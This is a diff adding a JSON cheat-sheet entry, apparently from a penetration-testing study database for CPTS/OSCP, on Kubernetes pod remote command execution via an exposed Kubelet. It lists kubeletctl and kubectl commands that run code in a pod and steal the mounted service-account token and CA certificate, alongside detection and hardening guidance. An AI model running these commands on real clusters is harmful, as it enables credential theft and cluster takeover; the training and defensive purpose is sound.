@@ -1,0 +1,107 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "https"
+  ],
+  "tools": [
+    "kubeletctl"
+  ],
+  "tags": [
+    "kubernetes",
+    "rce",
+    "service-account"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Kubernetes",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Run a command inside a pod via the Kubelet",
+      "command": "kubeletctl -i --server <ip> exec \"id\" -p <pod> -c <container>"
+    },
+    {
+      "label": "Steal the pod's service-account token",
+      "command": "kubeletctl -i --server <ip> exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p <pod> -c <container> | tee -a k8.token"
+    },
+    {
+      "label": "List what that token can do",
+      "command": "export token=`cat k8.token`; kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 auth can-i --list"
+    }
+  ],
+  "notes": "An exposed Kubelet (10250) that allows exec lets you run commands in any pod and read its mounted service-account token + CA cert. Those authenticate you to the API server for the next step.",
+  "references": [
+    {
+      "title": "kubeletctl (cyberark)",
+      "url": "https://github.com/cyberark/kubeletctl"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "k8s-privileged-pod",
+      "note": "If you can create pods, deploy one mounting host /.",
+      "rel": "next"
+    },
+    {
+      "id": "k8s-enum",
+      "note": "The enumeration that finds an exec-able Kubelet.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "k8s-rce-token",
+  "name": "Kubernetes - Pod RCE and Token Theft",
+  "command": "kubeletctl -i --server <ip> exec \"id\" -p <pod> -c <container>",
+  "description": "Run commands in an exposed pod via the Kubelet API, then steal the mounted service-account token and CA cert to authenticate to the API server as that pod.",
+  "steps": [
+    {
+      "label": "1. Execute in a pod",
+      "command": "kubeletctl -i --server 10.129.10.11 exec \"id\" -p nginx -c nginx"
+    },
+    {
+      "label": "2. Steal token + CA cert",
+      "command": "kubeletctl -i --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p nginx -c nginx | tee -a k8.token\nkubeletctl --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" -p nginx -c nginx | tee -a ca.crt"
+    },
+    {
+      "label": "3. Check API permissions",
+      "command": "export token=`cat k8.token`\nkubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1528",
+    "T1610"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Service account tokens automatically mounted in pods (/var/run/secrets/kubernetes.io/serviceaccount/token) grant API server access. kubeletctl executes commands inside running pods via the Kubelet API, allowing extraction of these tokens. With a high-privilege token, the attacker can create privileged pods or escalate within the cluster.",
+    "prerequisites": "Unauthenticated Kubelet API access (port 10250) or compromised pod access. A service account token with create pods or elevated permissions.",
+    "impact": "API-level privilege escalation: create privileged pods, access secrets, read all cluster resources, or gain node-level access by scheduling pods with host mounts.",
+    "detection": "Kubelet API exec requests (POST /exec on pods). Service account token used from unexpected IP addresses. kubectl commands with manually extracted token. SIEM: unusual API calls with service account credentials.",
+    "artifacts": "Kubelet API server log (exec to extract token) | Kubernetes audit log (pod creation with extracted token) | Network: kubectl API calls from attacker IP",
+    "prevention": "Disable automountServiceAccountToken for pods that don't need it. Grant least-privilege RBAC roles to service accounts. Restrict Kubelet API to authenticated access. Rotate service account tokens regularly. Deploy secrets encryption at rest.",
+    "misconfiguration": "Pods automount service account tokens with ClusterAdmin-equivalent permissions. Kubelet API allows unauthenticated command execution. Service account token has pod creation rights.",
+    "vulnerable_config": "# Pod with default token automounting\napiVersion: v1\nkind: Pod\nspec:\n  automountServiceAccountToken: true  # default\n  serviceAccountName: cluster-admin-sa  # overprivileged",
+    "secure_config": "# Disable automount by default\napiVersion: v1\nkind: Pod\nspec:\n  automountServiceAccountToken: false\n\n# ServiceAccount default\napiVersion: v1\nkind: ServiceAccount\nautomountServiceAccountToken: false\n\n# Grant minimal RBAC only\nkind: Role\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\"]  # not create",
+    "sources": [
+      "HTB M25",
+      "MITRE T1528",
+      "MITRE T1078.004"
+    ]
+  }
+}
